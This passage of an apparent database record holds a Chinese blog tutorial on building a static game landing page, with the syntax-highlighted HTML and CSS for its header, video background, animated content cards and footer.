punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>footer-bottom<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">&gt;</span></span>积极健康的游戏心态是健康游戏的开端，本游戏故事情节设置紧凑，请您合理控制游戏时间，避免沉溺游戏影响生活，注意自我保护，防范网络陷阱。<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">&gt;</span></span>\n            <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">&gt;</span></span>健康游戏忠告：抵制不良游戏，拒绝盗版游戏。注意自我保护，谨防受骗上当。适度游戏益脑，沉迷游戏伤身。合理安排时间，享受健康生活。<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">&gt;</span></span>\n        <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>video</span> <span class=\"token attr-name\">autoplay</span> <span class=\"token attr-name\">loop</span> <span class=\"token attr-name\">muted</span> <span class=\"token attr-name\">poster</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>images/bg.jpg<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>source</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>images/bg.mp4<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>video/mp4<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>source</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>images/bg.webm<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>video/webm<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>video</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">&gt;</span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">&gt;</span></span>\n</code></pre> \n <ul>\n  <li>css 样式代码</li>\n </ul> \n <pre><code class=\"prism language-css\"><span class=\"token comment\">/*背景开始*/</span>\n<span class=\"token selector\">video</span><span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 100%<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">height</span><span class=\"token punctuation\">:</span> 1080px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">object-fit</span><span class=\"token punctuation\">:</span> cover<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">background</span><span class=\"token punctuation\">:</span> red<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token comment\">/*背景结束*/</span>\n<span class=\"token comment\">/*头部开始*/</span>\n<span class=\"token selector\">.header</span><span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 1196px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">position</span><span class=\"token punctuation\">:</span> absolute<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">left</span><span class=\"token punctuation\">:</span> 50%<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">transform</span><span class=\"token punctuation\">:</span> <span class=\"token function\">translateX</span><span class=\"token punctuation\">(</span>-50%<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token property\">z-index</span><span class=\"token punctuation\">:</span> 999<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token selector\">.header&gt;ul</span><span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token property\">margin</span><span class=\"token punctuation\">:</span> 0<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">padding</span><span class=\"token punctuation\">:</span> 0<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">padding-top</span><span class=\"token punctuation\">:</span> 45px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">list-style</span><span class=\"token punctuation\">:</span> none<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token selector\">.header&gt;ul&gt;li</span><span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token property\">float</span><span class=\"token punctuation\">:</span> left<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 200px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">height</span><span class=\"token punctuation\">:</span> 60px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">line-height</span><span class=\"token punctuation\">:</span> 60px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">text-align</span><span class=\"token punctuation\">:</span> center<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">background</span><span class=\"token punctuation\">:</span> <span class=\"token function\">linear-gradient</span><span class=\"token punctuation\">(</span>to bottom<span class=\"token punctuation\">,</span> #46018c<span class=\"token punctuation\">,</span> #0200a1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token property\">border-right</span><span class=\"token punctuation\">:</span> 1px solid <span class=\"token function\">rgba</span><span class=\"token punctuation\">(</span>255<span class=\"token punctuation\">,</span>255<span class=\"token punctuation\">,</span>255<span class=\"token punctuation\">,</span>0.2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token property\">box-sizing</span><span class=\"token punctuation\">:</span> border-box<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token selector\">.header&gt;ul&gt;li:nth-child(2)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token property\">margin-right</span><span class=\"token punctuation\">:</span> 393px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">border-right</span><span class=\"token punctuation\">:</span> none<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token selector\">.header&gt;ul&gt;li:last-child</span><span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token property\">border-right</span><span class=\"token punctuation\">:</span> none<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">background</span><span class=\"token punctuation\">:</span> <span class=\"token url\"><span class=\"token function\">url</span><span class=\"token punctuation\">(</span><span class=\"token string url\">\"./../images/download2.0.png\"</span><span class=\"token punctuation\">)</span></span> no-repeat<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token selector\">.header&gt;ul&gt;li:last-child a</span><span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token property\">background</span><span class=\"token punctuation\">:</span> none<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token selector\">.header&gt;ul&gt;li&gt;a</span><span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token property\">display</span><span class=\"token punctuation\">:</span> inline-block<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 100%<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">height</span><span class=\"token punctuation\">:</span> 100%<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">font-size</span><span class=\"token punctuation\">:</span> 18px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">color</span><span class=\"token punctuation\">:</span> #fff<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">text-decoration</span><span class=\"token punctuation\">:</span> none<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">background</span><span class=\"token punctuation\">:</span> <span class=\"token url\"><span class=\"token function\">url</span><span class=\"token punctuation\">(</span><span class=\"token string url\">\"./../images/nav-itembg.png\"</span><span class=\"token punctuation\">)</span></span><span class=\"token punctuation\">;</span>\n    <span class=\"token property\">border-bottom</span><span class=\"token punctuation\">:</span> 2px solid transparent<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">box-sizing</span><span class=\"token punctuation\">:</span> border-box<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">transition</span><span class=\"token punctuation\">:</span> border-color 0.5s<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token selector\">.header&gt;ul&gt;li&gt;a:hover</span><span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token property\">border-color</span><span class=\"token punctuation\">:</span> #fff<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token selector\">.header&gt;h1</span><span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token property\">margin</span><span class=\"token punctuation\">:</span> 0<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">padding</span><span class=\"token punctuation\">:</span> 0<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">position</span><span class=\"token punctuation\">:</span> absolute<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">left</span><span class=\"token punctuation\">:</span> 50%<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">top</span><span class=\"token punctuation\">:</span> 0<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">transform</span><span class=\"token punctuation\">:</span> <span class=\"token function\">translateX</span><span class=\"token punctuation\">(</span>-50%<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token selector\">.header&gt;h1 img</span><span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 393px<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token comment\">/*头部结束*/</span>\n<span class=\"token comment\">/*内容开始*/</span>\n<span class=\"token selector\">.main</span><span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token property\">position</span><span class=\"token punctuation\">:</span> absolute<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">left</span><span class=\"token punctuation\">:</span> 0<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">top</span><span class=\"token punctuation\">:</span> 0<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 100%<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">height</span><span class=\"token punctuation\">:</span> 1080px<span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">/*background: skyblue;*/</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token selector\">.main&gt;.slogan</span><span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token property\">position</span><span class=\"token punctuation\">:</span> absolute<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">left</span><span class=\"token punctuation\">:</span> 50%<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">top</span><span class=\"token punctuation\">:</span> 235px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">transform</span><span class=\"token punctuation\">:</span> <span class=\"token function\">translateX</span><span class=\"token punctuation\">(</span>-50%<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token selector\">.main&gt;.list</span><span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token property\">margin</span><span class=\"token punctuation\">:</span> 0<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">padding</span><span class=\"token punctuation\">:</span> 0<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">list-style</span><span class=\"token punctuation\">:</span> none<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 1010px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">display</span><span class=\"token punctuation\">:</span> flex<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">justify-content</span><span class=\"token punctuation\">:</span> space-between<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">position</span><span class=\"token punctuation\">:</span> absolute<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">left</span><span class=\"token punctuation\">:</span> 50%<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">bottom</span><span class=\"token punctuation\">:</span> 0<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">transform</span><span class=\"token punctuation\">:</span> <span class=\"token function\">translateX</span><span class=\"token punctuation\">(</span>-50%<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token property\">z-index</span><span class=\"token punctuation\">:</span> 888<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token selector\">.main&gt;.list&gt;li</span><span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 310px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">height</span><span class=\"token punctuation\">:</span> 205px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">background</span><span class=\"token punctuation\">:</span> skyblue<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">position</span><span class=\"token punctuation\">:</span> relative<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token selector\">.main&gt;.list&gt;li:nth-child(1)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token comment\">/*margin-bottom: 120px;*/</span>\n    <span class=\"token comment\">/*bottom: 120px;*/</span>\n    <span class=\"token property\">animation</span><span class=\"token punctuation\">:</span> move 1s linear 1s normal<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">animation-fill-mode</span><span class=\"token punctuation\">:</span> forwards<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token selector\">.main&gt;.list&gt;li:nth-child(2)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token property\">animation</span><span class=\"token punctuation\">:</span> move 1s linear 2s normal forwards<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token selector\">.main&gt;.list&gt;li:nth-child(3)</span><span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token property\">animation</span><span class=\"token punctuation\">:</span> move 1s linear 3s normal forwards<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token atrule\"><span class=\"token rule\">@keyframes</span> move</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token selector\">from</span><span class=\"token punctuation\">{\n    <!-- --></span>\n        <span class=\"token property\">bottom</span><span class=\"token punctuation\">:</span> 0<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token selector\">to</span><span class=\"token punctuation\">{\n    <!-- --></span>\n        <span class=\"token property\">bottom</span><span class=\"token punctuation\">:</span> 120px<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token selector\">.main&gt;.list&gt;li&gt;h3</span><span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token property\">margin</span><span class=\"token punctuation\">:</span> 0<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">padding</span><span class=\"token punctuation\">:</span> 0<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 100%<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">height</span><span class=\"token punctuation\">:</span> 50px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">line-height</span><span class=\"token punctuation\">:</span> 50px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">text-align</span><span class=\"token punctuation\">:</span> center<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">font-size</span><span class=\"token punctuation\">:</span> 20px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">color</span><span class=\"token punctuation\">:</span> #fff<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">background</span><span class=\"token punctuation\">:</span> #15112d<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">border</span><span class=\"token punctuation\">:</span> 2px solid #2a2658<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">box-sizing</span><span class=\"token punctuation\">:</span> border-box<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token selector\">.main&gt;.list&gt;li&gt;a</span><span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token property\">display</span><span class=\"token punctuation\">:</span> inline-block<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 100%<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">border</span><span class=\"token punctuation\">:</span> 2px solid #655fc7<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">box-sizing</span><span class=\"token punctuation\">:</span> border-box<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token selector\">.main&gt;.list&gt;li&gt;a&gt;img</span><span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 100%<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">vertical-align</span><span class=\"token punctuation\">:</span> bottom<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token comment\">/*内容结束*/</span>\n<span class=\"token comment\">/*底部开始*/</span>\n<span class=\"token selector\">.footer</span><span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 100%<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">height</span><span class=\"token punctuation\">:</span> 502px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">background</span><span class=\"token punctuation\">:</span> #0d0017<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">position</span><span class=\"token punctuation\">:</span> absolute<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">top</span><span class=\"token punctuation\">:</span> 1080px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">left</span><span class=\"token punctuation\">:</span> 0<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">border-top</span><span class=\"token punctuation\">:</span> 2px solid #655fc7<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token selector\">.footer&gt;.footer-in</span><span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 1000px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">height</span><span class=\"token punctuation\">:</span> 422px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">margin</span><span class=\"token punctuation\">:</span> 0 auto<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token selector\">.footer-in&gt;.footer-top</span><span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token property\">padding-top</span><span class=\"token punctuation\">:</span> 125px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">padding-bottom</span><span class=\"token punctuation\">:</span> 45px<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token selector\">.footer-in&gt;.footer-top a</span><span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token property\">display</span><span class=\"token punctuation\">:</span> inline-block<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">text-decoration</span><span class=\"token punctuation\">:</span> none<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">font-size</span><span class=\"token punctuation\">:</span> 14px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">color</span><span class=\"token punctuation\">:</span> #fff<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">margin-right</span><span class=\"token punctuation\">:</span> 10px<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token selector\">.footer-in&gt;.footer-top a&gt;i</span><span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token property\">display</span><span class=\"token punctuation\">:</span> inline-block<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 19px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">height</span><span class=\"token punctuation\">:</span> 19px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">background</span><span class=\"token punctuation\">:</span> <span class=\"token url\"><span class=\"token function\">url</span><span class=\"token punctuation\">(</span><span class=\"token string url\">\"./../images/footer-top.png\"</span><span class=\"token punctuation\">)</span></span> no-repeat<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">background-position</span><span class=\"token punctuation\">:</span> -6px -7px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">margin-right</span><span class=\"token punctuation\">:</span> 10px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">vertical-align</span><span class=\"token punctuation\">:</span> middle<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token selector\">.footer-in&gt;.footer-top a:nth-child(2) i</span><span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token property\">background-position</span><span class=\"token punctuation\">:</span> -36px -8px<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token selector\">.footer-in&gt;.footer-top a:nth-child(3) i</span><span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token property\">background-position</span><span class=\"token punctuation\">:</span> -6px -100px<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token selector\">.footer-in&gt;.footer-top span</span><span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token property\">font-size</span><span class=\"token punctuation\">:</span> 14px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">color</span><span class=\"token punctuation\">:</span> #fff<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">margin</span><span class=\"token punctuation\">:</span> 0 10px<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token selector\">.footer-in&gt;.footer-top i</span><span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token property\">display</span><span class=\"token punctuation\">:</span> inline-block<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 95px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">height</span><span class=\"token punctuation\">:</span> 26px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">background</span><span class=\"token punctuation\">:</span> <span class=\"token url\"><span class=\"token function\">url</span><span class=\"token punctuation\">(</span><span class=\"token string url\">\"./../images/footer-top.png\"</span><span class=\"token punctuation\">)</span></span> no-repeat<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">background-position</span><span class=\"token punctuation\">:</span> -142px -44px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">vertical-align</span><span class=\"token punctuation\">:</span> top<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token selector\">.footer-in&gt;.footer-top b</span><span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token property\">display</span><span class=\"token punctuation\">:</span> inline-block<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 14px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">height</span><span class=\"token punctuation\">:</span> 14px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">line-height</span><span class=\"token punctuation\">:</span> 14px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">text-align</span><span class=\"token punctuation\">:</span> center<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">font-size</span><span class=\"token punctuation\">:</span> 12px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">color</span><span class=\"token punctuation\">:</span> #fff<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">background</span><span class=\"token punctuation\">:</span> #2b0473<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">border</span><span class=\"token punctuation\">:</span> 1px solid #462385<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token selector\">.footer-in&gt;.footer-top p</span><span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token property\">height</span><span class=\"token punctuation\">:</span> 30px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">line-height</span><span class=\"token punctuation\">:</span> 30px<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token selector\">.footer-in&gt;.footer-middle&gt;.middle-left</span><span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token comment\">/*注意点: 在企业开发中, 如果元素是左浮动的, 就不要设置左边的margin*/</span>\n    <span class=\"token property\">margin-right</span><span class=\"token punctuation\">:</span> 75px<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token selector\">.footer-in&gt;.footer-middle&gt;.middle-right</span><span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token property\">font-size</span><span class=\"token punctuation\">:</span> 14px<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token selector\">.footer-in&gt;.footer-middle&gt;.middle-right a</span><span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token property\">text-decoration</span><span class=\"token punctuation\">:</span> none<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">color</span><span class=\"token punctuation\">:</span> #ccc<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token selector\">.footer-in&gt;.footer-middle&gt;.middle-right a:hover</span><span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token property\">color</span><span class=\"token punctuation\">:</span> #fff<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token selector\">.footer-in&gt;.footer-middle&gt;.middle-right span</span><span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token property\">color</span><span class=\"token punctuation\">:</span> #ccc<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">margin</span><span class=\"token punctuation\">:</span> 0 10px<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token selector\">.footer-in&gt;.footer-middle&gt;.middle-right&gt;div p</span><span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token property\">font-size</span><span class=\"token punctuation\">:</span> 12px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">color</span><span class=\"token punctuation\">:</span> #8eb1bc<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token selector\">.footer-in&gt;.footer-middle&gt;.middle-right&gt;div a</span><span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token property\">color</span><span class=\"token punctuation\">:</span> #8eb1bc<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token selector\">.footer-in&gt;.footer-bottom</span><span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token property\">padding-top</span><span class=\"token punctuation\">:</span> 35px<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token selector\">.footer-in&gt;.footer-bottom&gt;p</span><span class=\"token punctuation\">{\n    <!-- --></span>\n    <span class=\"token property\">font-size</span><span class=\"token punctuation\">:</span> 12px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">color</span><span class=\"token punctuation\">:</span> #417aa1<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">line-height</span><span class=\"token punctuation\">:</span> 10px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">text-align</span><span class=\"token punctuation\">:</span> center<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token comment\">/*底部结束*/</span>\n</code></pre> \n <ul>\n  <li>以上就是核心代码，基本没有任何难度，就是个静态网页实战。</li>\n </ul> \n <p><strong>最后，点赞，在看，关注，评论，四连支持。</strong></p> \n</div>', '2021-06-12', NULL, '默认分类', '', 1, 0, NULL, NULL, 0);
